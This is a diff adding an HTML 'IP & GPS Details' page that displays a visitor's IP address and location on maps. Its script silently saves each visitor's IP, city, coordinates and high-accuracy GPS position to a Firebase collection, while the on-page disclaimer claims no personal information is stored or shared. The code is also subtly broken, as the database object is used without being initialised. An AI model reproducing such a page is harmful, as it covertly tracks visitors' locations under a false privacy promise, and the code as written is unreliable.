@@ -1,0 +1,222 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Your IP & Location</title>
+
+  <!-- Google Fonts Bebas Neue -->
+  <link href="https://fonts.googleapis.com/css2?family=Bebas+Neue&display=swap" rel="stylesheet">
+
+  <!-- Leaflet CSS -->
+  <link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css" />
+
+  <!-- Firebase -->
+  <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-firestore-compat.js"></script>
+
+  <style>
+    body {
+      font-family: 'Bebas Neue', sans-serif;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      background: linear-gradient(135deg, #171e25, #001aff);
+      color: white;
+      text-align: center;
+      padding: 35px;
+      min-height: 100vh;
+    }
+
+    h1 { font-size: 4rem; margin-bottom: 10px; }
+    h2 { font-size: 2rem; margin-top: 30px; }
+    #ip { font-size: 1.5rem; font-weight: bold; margin-bottom: 10px; }
+    #location { font-size: 1rem; margin-bottom: 20px; }
+
+    .buttons { display: flex; gap: 10px; margin-bottom: 20px; }
+    button {
+      font-family: 'Bebas Neue', sans-serif;
+      letter-spacing: 2px;
+      text-transform: uppercase;
+      font-weight: 400;
+      background: rgb(255, 255, 255);
+      color: #00063d;
+      border: none;
+      padding: 10px 25px;
+      border-radius: 8px;
+      font-size: 1rem;
+      cursor: pointer;
+      transition: background 0.3s, transform 0.2s;
+    }
+    button:hover { background: #c7c7c7; transform: scale(1.05); }
+
+    #ipMap, #gpsMap {
+      height: 300px;
+      width: 90%;
+      max-width: 600px;
+      border-radius: 12px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.3);
+      margin-bottom: 20px;
+    }
+
+    #disclaimer {
+      margin-top: 40px;
+      font-size: 0.9rem;
+      opacity: 0.8;
+      color: #e0e0e0;
+      letter-spacing: 1px;
+    }
+  </style>
+</head>
+<body>
+  <h1>IP & GPS Details</h1>
+  <p id="ip">Loading IP...</p>
+  <p id="location"></p>
+
+  <div class="buttons" id="btnContainer" style="display:none;">
+    <button id="copyBtn">Copy IP</button>
+    <button id="downloadBtn">Download Info</button>
+  </div>
+
+  <h2>IP-Based Location</h2>
+  <div id="ipMap"></div>
+
+  <h2>GPS-Based Location</h2>
+  <div id="gpsMap"></div>
+
+  <p id="disclaimer">
+    ⚠️ This site only displays publicly available IP and location data. No personal information is stored or shared.
+  </p>
+
+  <!-- Leaflet JS -->
+  <script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
+
+  <script>
+
+    // ====== Firebase Setup ======
+  const firebaseConfig = {
+  apiKey: "AIzaSyBdwxGTkXdNHvEMvqUtSNKUR0ExWRbY0VU",
+  authDomain: "ipdata-72bde.firebaseapp.com",
+  projectId: "ipdata-72bde",
+  storageBucket: "ipdata-72bde.firebasestorage.app",
+  messagingSenderId: "256643340987",
+  appId: "1:256643340987:web:72cc3a0fe1c966cf6da79e",
+  measurementId: "G-H31379LG9E"
+};
+
+    // ====== Page Elements ======
+    const ipElement = document.getElementById('ip');
+    const locationElement = document.getElementById('location');
+    const btnContainer = document.getElementById('btnContainer');
+    const copyBtn = document.getElementById('copyBtn');
+    const downloadBtn = document.getElementById('downloadBtn');
+    let ipData = {};
+
+    // ====== Map Function ======
+    function createMap(divId, lat, lon, label) {
+      const map = L.map(divId).setView([lat, lon], 10);
+      L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+        maxZoom: 19,
+        attribution: '&copy; OpenStreetMap contributors'
+      }).addTo(map);
+      const marker = L.marker([lat, lon]).addTo(map);
+      marker.bindPopup(label).openPopup();
+      return map;
+    }
+
+    // ====== Fetch IP ======
+    fetch('https://api.ipify.org?format=json')
+      .then(res => res.json())
+      .then(data => {
+        ipData.ip = data.ip;
+        ipElement.textContent = `Your IP: ${ipData.ip}`;
+        return fetch(`https://ipapi.co/${ipData.ip}/json/`);
+      })
+      .then(res => res.json())
+      .then(geo => {
+        ipData.city = geo.city || "Unknown city";
+        ipData.region = geo.region || "Unknown region";
+        ipData.country = geo.country_name || "Unknown country";
+        ipData.lat = geo.latitude;
+        ipData.lon = geo.longitude;
+
+        locationElement.textContent = `📍 ${ipData.city}, ${ipData.region}, ${ipData.country} (Lat: ${ipData.lat}, Lon: ${ipData.lon})`;
+        btnContainer.style.display = 'flex';
+
+        // IP map
+        createMap('ipMap', ipData.lat, ipData.lon, `${ipData.city}, ${ipData.country}`);
+
+        // ====== Save to Firebase ======
+        db.collection("ips").add({
+          ip: ipData.ip,
+          city: ipData.city,
+          region: ipData.region,
+          country: ipData.country,
+          lat: ipData.lat,
+          lon: ipData.lon,
+          timestamp: new Date()
+        })
+        .then(docRef => console.log("Saved to Firebase:", docRef.id))
+        .catch(err => console.error("Error saving to Firebase:", err));
+
+        // ====== GPS Map ======
+        if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition(
+            pos => {
+              const { latitude, longitude } = pos.coords;
+              locationElement.textContent += `\n📡 Updated via GPS: (${latitude.toFixed(4)}, ${longitude.toFixed(4)})`;
+              createMap('gpsMap', latitude, longitude, 'Your GPS location');
+
+              // Optional: Save GPS update to Firebase
+              db.collection("ips").add({
+                ip: ipData.ip,
+                city: ipData.city,
+                region: ipData.region,
+                country: ipData.country,
+                lat: latitude,
+                lon: longitude,
+                timestamp: new Date(),
+                gps: true
+              });
+            },
+            err => {
+              document.getElementById('gpsMap').innerHTML = '<p>⚠️ GPS permission denied or unavailable.</p>';
+            },
+            { enableHighAccuracy: true, timeout: 5000 }
+          );
+        }
+
+        // ====== Copy Button ======
+        copyBtn.addEventListener('click', () => {
+          navigator.clipboard.writeText(ipData.ip);
+          copyBtn.textContent = 'Copied!';
+          setTimeout(() => copyBtn.textContent = 'Copy IP', 2000);
+        });
+
+        // ====== Download Button ======
+        downloadBtn.addEventListener('click', () => {
+          const now = new Date();
+          const fileContent = 
+`Your IP Address: ${ipData.ip}
+Location: ${ipData.city}, ${ipData.region}, ${ipData.country}
+Coordinates: ${ipData.lat}, ${ipData.lon}
+GPS: ${ipData.gpsLat || 'N/A'}, ${ipData.gpsLon || 'N/A'}
+Generated on: ${now.toString()}
+`;
+          const blob = new Blob([fileContent], { type: 'text/plain' });
+          const url = URL.createObjectURL(blob);
+          const a = document.createElement('a');
+          a.href = url;
+          a.download = 'ip-info.txt';
+          a.click();
+          URL.revokeObjectURL(url);
+        });
+
+      })
+      .catch(err => {
+        console.error(err);
+        ipElement.textContent = 'Error fetching IP or location';
+      });
+  </script>
+</body>
+</html>
